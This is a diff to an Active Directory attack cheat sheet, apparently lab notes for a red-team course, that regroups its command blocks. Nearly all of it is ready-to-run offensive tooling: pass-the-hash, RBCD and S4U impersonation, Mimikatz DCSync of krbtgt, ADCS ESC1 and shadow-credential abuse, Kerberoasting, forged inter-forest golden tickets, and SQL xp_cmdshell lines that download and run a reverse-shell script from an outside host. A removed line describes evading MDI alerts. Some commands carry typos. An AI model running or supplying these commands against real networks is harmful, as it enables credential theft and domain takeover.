@@ -1000,38 +1000,26 @@ Get-AdmPwdPassword -ComputerName <targetmachine>
 >   4.   Once we compromised a principal that can read the blob, use `DSInternals` to compute the NTLM hash.
 >   5.   Pass the NTLM hash of `gMSA` and get the privileges.
 
-###### 1. Enumeration of account
-
 ```powershell
+# 1. Enumeration of account
 # Using ADModule
 Get-ADServiceAccount -Filter *
 
 # Using PowerView
 Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
-```
 
-###### 2. Enumerate password blob
-
-```powershell
+# 2. Enumerate password blob
 # List principals that can read the password blob
 Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
-```
 
-###### 3. Compute NTLM hash from password blob
-
-```powershell
+# 3. Compute NTLM hash from password blob
 $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
 Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
 $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordlob ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
-```
 
-###### 4. Pass the Hash
-
-```powershell
+# 4. Pass the Hash
 sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c...
 ```
-
-
 
 ### MS Exchange
 
@@ -1047,46 +1035,32 @@ sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c...
 
 ##### MailSniper
 
-###### 1. Enumerate all mailboxes
-
 ```powershell
-Get-GlobalAddressList -ExchHostname us-exchange -verbose -UserName us\studentuser1 -password <password> -
-```
+# 1. Enumerate all mailboxes
+Get-GlobalAddressList -ExchHostname us-exchange -verbose -UserName us\studentuser1 -password <password>
 
-###### 2. Enumerate all mailboxes we have access to (means current user)
-
-```powershell
+# 2. Enumerate all mailboxes we have access to (means current user)
 Invoke-OpenInboxFinder -EmailList C:\AD\Tools\emails.txt -ExchHostname us-exchange -verbose 
-```
 
-###### 3. Once we have identified mailboxes where we can read emails, use the following to read emails. The below command looks for terms like pass, creds, credentials from top 100 emails of :
-
-```powershell
+# 3. Once we have identified mailboxes where we can read emails, use the following to read emails. The below command looks for terms like pass, creds, credentials from top 100 emails.
 Invoke-SelfSearch -Mailbox pwnadmin@techcorp.local -ExchHostname us-exchange -OutputCsv .\mail.csv
 ```
 
->   Alternatively, using exchange manager (Organization Management) or exchange user (Exchange Trusted Subsystem) privileges also allows us to read the emails!
-
 ### Resource Based Constrained Delegation
 
-###### 1. Enumerate if we have Write permissions over any object
+###### 
 
 ```powershell
+# 1. Enumerate if we have Write permissions over any object
 # PowerView
 Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}
-```
 
-###### 2. Configure RBCD on us-helpdesk for student machines
-
-```powershell
+# 2. Configure RBCD on us-helpdesk for student machines
 # Using AD Module
 $comps = 'student1$','student2$'
 Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount $comps
-```
 
-###### 3. We we can dump the AES Keys of the Students
-
-```powershell
+# 3. We we can dump the AES Keys of the Students
 # Mimikatz
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 
@@ -1095,21 +1069,11 @@ SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
 
 # SafetyKatz Old (For Windows 2020 Server)
 SafetyKatz_old.exe -Command "sekurlsa::ekeys" "exit"
-```
 
-###### 4. Rubeus
-
->   Use the AES key of studentx$ with Rubeus and access us-helpdesk as ANY user we want
-
-```powershell
+# 4. Rubeus
 .\Rubeus.exe s4u /user:student1$ /aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d83b9e6b7fc7897c2 /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
-```
 
-###### 5. Winrs
-
->   Now we can connect to the session
-
-```powershell
+# 5. Winrs
 winrs -r:us-helpdesk cmd.exe
 ```
 
@@ -1510,39 +1474,26 @@ Get-RemoteCachedCredential -ComputerName us-dc -Verbose
 > 3. Execute adconnect.ps1 script, this will provide the creds of the user
 > 4. Connect using runas and perform a DCSync Attack
 
----
-
-##### PowerShell
-
-###### 1. Enumerate the PHS account and server where AD Connect is installed
+------
 
 ```powershell
+# 1. Enumerate the PHS account and server where AD Connect is installed
 # Powerview
 Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
 
 # AD Module
 Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Server techcorp.local -Properties * | select SamAccountName,Description | fl
-```
 
-###### 2. Dump the creds of the user and logon
-
-> With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text
-> Note: Adconnect.ps1 script's code runs powershell.exe so verbose logs (like transcripts) will be there.
-
-```powershell
-# Adconnect
+# 2. Dump the creds of the user and logon
+# Adconnect - With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text
 . .\adconnect.ps1
 adconnect
 
-# Runas that user
+# or Runas that user
 runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
-```
 
-###### 3. Execute the DCSync attack
+# 3. Execute the DCSync attack
 
-> Please note that because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the **MSOL_** account will be excluded from tools like MDI! This will allow us to run DCSync without any alerts!
-
-```powershell
 # Invoke-Mimikatz
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
@@ -1654,9 +1605,10 @@ Certify.exe request /ca:da.theshrine.local\theshrine-DC-CA /template:user
 
 ##### Binaries
 
-###### 1. Search for vulnerable certificate templates
+###### 
 
 ```powershell
+# 1. Search for vulnerable certificate templates
 # Certify
 # Enumerate the templates
 Certify.exe find
@@ -1667,38 +1619,20 @@ Certify.exe find /vulnerable
 
 # Enumerate vulnerable templates using ca
 Certify.exe find /vulnerable /ca:dc.theshire.local\theshire-DC-CA
-```
 
-###### 2. Enroll in the template
-
-```powershell
+# 2. Enroll in the template
 # Certify
 Certify.exe request /cs:dc.theshire.local\theshire-DC-CA /template:ESC1Template /altname:Administrator
 
-# CRTE Lab
-C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
-```
-
-###### 3. Change the RSA into a PFX
-
->   Paste the Private key in a file named : *cert.pem*
-
-```powershell
-# linux
-# openssl and provide a password
+# 3. Change the RSA into a PFX
+# Linux - openssl and provide a password
+# Paste the Private key in a file named cert.pem
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
-```
 
-```powershell
-# windows
-# openssl and provide a password
+# Windows - openssl and provide a password
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem - keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
-```
 
-###### 4. Request a TGT with the pfx
-
-```powershell
-# Rubeus
+# 4. Request a TGT with the pfx
 # Request DA TGT and inject it
 Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:password /ptt
 
@@ -1718,66 +1652,42 @@ Users and Computer shave `msDS-KeyCredentialLink` attribute that contains the ra
 
 ##### Abusing User Object
 
-###### 1. Enumerate the permissions
-
 ```powershell
+# 1. Enumerate the permissions
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
-```
 
-###### 2. Add the Shadow Credential
-
-```powershell
+# 2. Add the Shadow Credential
 Whisker.exe add /target:supportXuser
-```
 
-###### 3. Using PowerView, see if the Shadow Credential is added.
-
-```powershell
+# 3. Using PowerView, see if the Shadow Credential is added.
 Get-DomainUser -Identity supportXuser
-```
 
-###### 4. Request the TGT by leveraging the certificate
-
-```powershell
+# 4. Request the TGT by leveraging the certificate
 Rubeus.exe asktgt /user:supportXuser /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW.... /password:"1OT0qAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
-```
 
-###### 5. Inject the TGT in the current session or use the NTLM hash
-
-```powershell
+# 5. Inject the TGT in the current session or use the NTLM hash
 Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
 ```
 
 ##### Abusing Computer Object
 
-###### 1. Enumerate the permissions
+###### 
 
 ```powershell
+# 1. Enumerate the permissions
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "mgmtadmin"}
-```
 
-###### 2. Add the Shadow Credentials
-
-```powershell
+# 2. Add the Shadow Credentials
 SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:328... /run:cmd.exe" "exit"
 Whisker.exe add /target:us-helpdesk$
-```
 
-###### 3. Using PowerView, see if the Shadow Credential is added
-
-```powershell
+# 3. Using PowerView, see if the Shadow Credential is added
 Get-DomainComputer -Identity us-helpdesk
-```
 
-###### 4. Request the TGT by leveraging the certificate
-
-```powershell
+# 4. Request the TGT by leveraging the certificate
 Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MIIJ0A... /password:"ViGFo..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
-```
 
-###### 5. Request and Inject the TGS by impersonating the user
-
-```powershell
+# 5. Request and Inject the TGS by impersonating the user
 Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGk... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
 ```
 
@@ -1792,13 +1702,8 @@ Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGk... /impersonateuser:adm
 >   3.  Crack the ticket using JTR
 >   4.  Using PowerShell request a TGS across trust
 
-##### PowerShell
-
-###### 1. Find user accounts used as Service account
-
->   It is possible to execute Kerberoast across Forest trusts
-
 ```powershell
+# 1. Find user accounts used as Service account
 # Powerview
 Get-NetUser -SPN
 Get-NetUser -SPN -Verbose | select displayname,memberof
@@ -1806,31 +1711,17 @@ Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SP
 
 # AD Module
 Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName -Server $_.Name}
-```
 
-###### 2. Request a TGS
-
-```powershell
+# 2. Request a TGS
 C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:euhashes.txt
-```
 
-###### 3. Check for the TGS
-
-```powershell
+# 3. Check for the TGS
 klist
-```
 
-###### 4. Crack the ticket using JTR
-
-```powershell
+# 4. Crack the ticket
 john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
-```
 
-##### PowerShell
-
-###### 5. Request TGS across trust
-
-```powershell
+# 5. Request TGS across trust
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/eu-file.eu.local@eu.local
 ```
@@ -1850,38 +1741,23 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 ##### Invoke-Mimikatz
 
-###### 1. We require the trust key of inter-forest trust
-
 ```powershell
+# 1. We require the trust key of inter-forest trust
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-```
 
-###### 2. Forge the inter-forest TGT
-
-```powershell
+# 2. Forge the inter-forest TGT
 Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'
 
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
-```
 
-###### 3. Request a TGS
-
->   Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo
-
-```powershell
-# keko
+# 3. Request a TGS [keko]
+# Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo
 tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local
-# Or using older version of Kekeo
-.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/techcorp-dc.techcorp.local
-```
 
-###### 4. Inject and use the TGS
-
->   Use the TGS to access the targeted service (may need to use it twice)
-
-```powershell
+# 4. Inject and use the TGS
+# Use the TGS to access the targeted service (may need to use it twice)
 misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi 
 # Or
 .\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi
@@ -1933,34 +1809,22 @@ Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-77939634
 
 ### PAM Trust
 
-###### 1. Enumerating trusts and hunting for access
-
->   We have DA access to the **techcorp.local** forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the **bastion.local** forest.
-
 ```powershell
-# PowerView
-# From techcorp-dc
+# 1. Enumerating trusts and hunting for access [PowerView]
+# We have DA access to the techcorp.local forest. By enumerating trusts and hunting for access, we can enumerate that we have Administrative access to the bastion.local forest.
 Get-ADTrust -Filter * 
 Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
-```
 
-###### 2. Enumerate if there is a PAM trust
-
-```powershell
-# PowerView
+# 2. Enumerate if there is a PAM trust [PowerView]
 $bastiondc = New-PSSession bastion-dc.bastion.local 
 Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined - eq $False)}} -Session $bastiondc
-```
 
-###### 3. Check which users are members of the Shadow Principals
 
-```powershell
+# 3. Check which users are members of the Shadow Principals
 Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
-```
 
-###### 4. Establish a direct PSRemoting session on bastion-dc and access production.local
 
-```powershell
+# 4. Establish a direct PSRemoting session on bastion-dc and access production.local
 Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
 ```
 
@@ -1984,22 +1848,15 @@ Import-Module .\PowerUpSQL.psd1
 
 ##### PowerUpSQL [ Basic Enumeration ]
 
-###### 1. Enumerate SPN
-
 ```powershell
+# 1. Enumerate SPN
 Get-SQLInstanceDomain
-```
 
-###### 2. Check Access
-
-```powershell
+# 2. Check Access
 Get-SQLConnectionTestThreaded
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
-```
 
-###### 3. Check Privileges / Gather Information
-
-```powershell
+# 3. Check Privileges / Gather Information
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
@@ -2036,29 +1893,19 @@ EXEC sp_serveroption 'LinkedServer', 'rpc out', 'true';
 
 ##### PowerUpSQL [ Abusing the privileges ]
 
-###### 1. Enumerate SQL Server links
-
 ```powershell
+# 1. Enumerate SQL Server links
 Get-SQLServerLink -Instance <instanceName> -Verbose
 select * from master..sysservers
-```
 
-###### 2. Enumerate DB links
-
-```powershell
+# 2. Enumerate DB links
 Get-SQLServerLinkCrawl -Instance dcorp-mysql -Verbose
 select * from openquery("<instanceName>",'select * from openquery("<linkedInstance>",''select * from master..sysservers'')')
-```
 
-###### 3. Execute commands on target server
-
-```powershell
+# 3. Execute commands on target server
 Get-SQLServerLinkCrawl -Instance dcorp-mysql -Query "exec master..xp_cmdshell 'whoami'" | ft
-```
 
-###### Download file on target server
-
-```powershell
+# 4. Download file on target server
 Get-SQLServerLinkCrawl -Instance <instanceName> -Query 'exec master..xp_cmdshell "powershell -c iex (new-object net.webclient).downloadstring(''http://IP:8080/Invoke-HelloWorld.ps1'',''C:\Windows\Temp\Invoke-HelloWorld.ps1'')"'
 
 Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.21/Invoke-PowerShellTcp.ps1'')"'
@@ -2104,6 +1951,3 @@ Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT 
 # Query command to a linked DB
 Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName" -QueryTarget db-sqlsrv
 ```
-
-
-
